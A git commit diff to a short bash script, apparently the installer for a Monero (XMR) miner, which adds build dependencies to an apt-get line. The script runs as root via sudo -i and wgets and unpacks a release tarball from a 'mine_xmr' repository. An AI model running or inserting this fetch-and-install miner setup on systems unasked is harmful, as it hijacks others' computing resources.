3e8354d5b2c84529b02848c334f5d84b40e335d0
yuqingkj <42601051+yuqingkj@users.noreply.github.com>
2022-09-20 22:25:05 +0800

    Update m426.sh

--- m426.sh
+++ m426.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo -i <<EOF
- apt-get install libhwloc-dev -y
+ apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 wget https://github.com/yuqingkj/mine_xmr/releases/download/6.18.0/m426.tar.gz
 tar -xvf m426.tar.gz
 cd m426/
